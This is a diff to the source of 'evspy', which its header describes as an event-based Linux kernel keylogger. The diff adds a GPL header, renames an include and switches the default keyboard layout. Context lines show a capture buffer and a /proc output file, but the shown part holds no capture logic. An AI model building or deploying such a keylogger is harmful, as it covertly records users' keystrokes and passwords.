@@ -1,3 +1,25 @@
+/*
+ *   evspy - event based keylogger (Linux module)
+ *
+ *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
+ *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
+ *
+ * This file is part of evspy
+ *
+ * evspy is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * evspy is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
 #include <linux/cred.h>
 #include <linux/init.h>
 #include <linux/input.h>
@@ -8,10 +30,14 @@
 #include <linux/stat.h>
 #include <linux/string.h>
 #include <asm/page.h>
-#include "khashmap/khashmap.h"
+#include "khm/khm.h"
+
+// Keyboard layouts
+#define EVS_KLAY_EN		0
+#define EVS_KLAY_ES		1
 
 #define EVS_NAME		"evspy"				// driver name
-#define EVS_KLAY		EVS_KLAY_EN			// change this to your keyboard layout
+#define EVS_KLAY		EVS_KLAY_ES			// change this to your keyboard layout
 #define EVS_TROLL		1					// clear this if you're a serious guy
 #define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
 #define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc
